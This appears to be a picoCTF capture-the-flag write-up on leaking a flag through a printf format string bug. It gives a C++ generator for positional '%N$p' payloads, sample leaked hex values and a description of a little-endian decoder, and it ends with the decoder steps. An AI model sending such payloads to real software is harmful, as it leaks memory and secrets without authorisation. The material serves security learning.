# Format String Leak — My Own Toolchain

**Platform:** picoCTF  
**Technique:** Format String Leak + Custom Decoder  
**Difficulty:** Easy  

## Challenge Description

A simple format string vulnerability where the program prints user input using `printf` directly. By sending format specifiers, we can leak values from the stack. The flag is stored in memory and appears in the leaked data.

## Exploitation

### Step 1: Generate Leak Payload

Instead of writing a one-off Python script, I used my own C++ format string generator:

```cpp
#include<iostream>
using namespace std;

int main(){
    int start, end;
    cout<<"Enter the start: ";
    cin>>start;
    cout<<"Enter the end: ";
    cin>>end;
    for (int i = start; i<=end; i++){
        cout<<"|"<<i<<"=%"<<i<<"$p";
    }
    return 0;
}
```
This generates payloads like:

```text
|1=%1$p|2=%2$p|3=%3$p...|50=%50$p
```
The $ syntax allows direct parameter access — %10$p prints the 10th argument as a pointer.

Step 2: Leak Stack Values
I sent the payload to the remote program and captured the output. The leak included hex values like:

```text
0x6f636970 0x7b465443 0x306c5f49 ...
```
Step 3: Decode with Custom Tool
I piped the leak output into my multi-hex little-endian decoder:

```cpp
// Multi-hex decoder — built in C++
// Handles pipes, spaces, multiple hex values
// Converts little-endian hex to ASCII
```
The decoder:

Cleans the input (removes |, =, spaces)

Extracts every hex value

Reverses bytes (little-endian correction)

Filters non-printable characters

Outputs readable ASCII
